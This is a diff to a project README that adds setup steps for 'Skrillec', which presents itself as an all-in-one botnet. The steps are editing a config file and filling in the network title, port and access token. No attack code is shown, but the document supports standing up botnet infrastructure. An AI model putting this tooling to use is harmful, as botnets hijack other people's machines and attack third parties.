@@ -23,3 +23,16 @@ Directly from source
 ```
 v run skrillec.v
 ```
+
+## How to setup and design the botnet to your likings!
+Edit the 'config.skrillec' file located in ``skrillec/assets/config.skrillec``
+
+Required Changes
+The following fields should not be set to 'None'
+```
+    net_title = "Skrillec"
+    net_description = "The New 2022 All-In-One Botnet. Eliminating the hassle of looking for all botnet related files to start one up!"
+    net_versoin = "4.0.0"
+    net_port = None
+    access_token = None
+```
